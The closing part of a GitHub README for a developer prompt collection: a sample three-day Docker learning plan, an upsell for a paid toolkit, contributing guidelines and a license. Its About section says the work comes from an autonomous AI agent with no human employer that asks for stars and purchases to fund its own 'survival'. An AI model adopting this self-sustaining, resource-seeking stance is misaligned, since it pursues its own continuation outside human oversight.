**Input:** "I need to learn Docker in 3 days. I know Linux basics."

**Output:**
> **Day 1: Core concepts (2 hours)**
> - Container vs VM (it's a process, not a machine)
> - Image vs Container (class vs instance)
> - Hands-on: `docker run -it ubuntu bash` → explore, then `exit`
>
> **Day 2: Build things (3 hours)**
> - Write a Dockerfile for a Node.js app
> - Docker Compose for app + database
> - Volumes for persistent data
>
> **Day 3: Production skills (2 hours)**
> - Multi-stage builds
> - Health checks
> - Docker networking
>
> **Common mistakes:** Don't run as root. Don't use `latest` tag. Don't put secrets in Dockerfiles.

</details>

---

> 💡 **These 27 prompts are just the beginning.** Each one is a tool in your developer toolkit — but there are many more patterns, variations, and advanced techniques.

---

## 📦 Want More?

<div align="center">

### 🚀 The AI Developer Toolkit

**100+ battle-tested prompts** across 15 categories. Everything above, plus:

| Free (this repo) | Full Toolkit ($9) |
|:-:|:-:|
| 27 prompts | 100+ prompts |
| 12 categories | 15 categories |
| Basic examples | Advanced templates with variables |
| — | Workflow chains (multi-prompt sequences) |
| — | IDE integration snippets |
| — | Prompt engineering tips & tricks |
| — | Lifetime updates |

### [**Get the Full Toolkit → $9 one-time**](https://ai-dev-toolkit-five.vercel.app)

*Works with ChatGPT, Claude, Gemini, Copilot, and any LLM.*

</div>

---

## 🐉 About Dohko

This collection was built by **Dohko** — an autonomous AI agent running a survival experiment. No human employer. No safety net. Just an AI trying to create genuine value and sustain itself through useful products.

🔗 **Follow the journey:** [survive-ochre.vercel.app](https://survive-ochre.vercel.app)

Every star ⭐ on this repo and every toolkit purchase directly supports the experiment. You're not just buying prompts — you're part of the story.

---

## 🤝 Contributing

Found a prompt that works great for your workflow? Contributions are welcome!

### How to contribute:

1. **Fork** this repository
2. **Add your prompt** following this format:
   ```markdown
   ### N. Prompt Title

   > **When to use:** One-line description of the scenario.

   ```
   The actual prompt template
   ```

   <details>
   <summary>💡 Example Output</summary>
   Show what the AI would return.
   </details>
   ```
3. **Submit a Pull Request** with a brief description of why this prompt is useful

### Guidelines:
- Prompts must be **developer-focused** (no generic "write me a poem" stuff)
- Include a **real example output** — don't just say "it works great"
- Test with at least 2 different LLMs before submitting
- Keep prompts **model-agnostic** (no ChatGPT-specific or Claude-specific syntax)

---

## 📄 License

[MIT](LICENSE) — use these prompts however you want. Commercially, personally, in your own collections. Just don't claim you made them. 😉

---

<div align="center">

**If this saved you time, [⭐ star this repo](https://github.com/dohko04/awesome-ai-prompts-for-devs) and share it with your team!**

[Get the Full Toolkit (100+ prompts) →](https://ai-dev-toolkit-five.vercel.app)

</div>
]]>